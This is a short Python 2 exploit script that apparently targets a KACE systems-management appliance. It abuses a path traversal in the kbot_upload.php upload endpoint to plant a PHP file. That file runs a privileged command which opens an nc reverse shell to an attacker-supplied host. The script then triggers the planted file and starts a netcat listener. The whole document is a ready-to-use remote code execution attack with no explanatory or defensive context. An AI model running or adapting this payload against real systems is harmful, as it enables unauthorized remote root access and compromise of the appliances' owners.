import urllib2,sys,subprocess,socket
socket.setdefaulttimeout(1.0)

if(len(sys.argv) != 4):
	print 'Usage: %s %s' % (sys.argv[0],'http://example.com connect_back_host connect_back_port')
	sys.exit()

payload = "<?php sleep(2); require_once 'KSudoClient.class.php';KSudoClient::RunCommandWait('rm /kbox/kboxwww/tmp/db.php;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f');?>" % (sys.argv[2],sys.argv[3])
targeturl = '%s/service/kbot_upload.php?filename=db.php&machineId=../../../kboxwww/tmp/&checksum=SCRAMBLE&mac=xxx&kbotId=blah&version=blah&patchsecheduleid=blah' % (sys.argv[1])
triggerurl = '%s/tmp/db.php' % (sys.argv[1])
print 'uploading payload'
conn = urllib2.urlopen(targeturl,payload,timeout=1)
print 'triggering payload'
try:
	conn = urllib2.urlopen(triggerurl)
except:
	pass
print 'starting listener'
subprocess.call("nc -vvl 4444",shell=True)
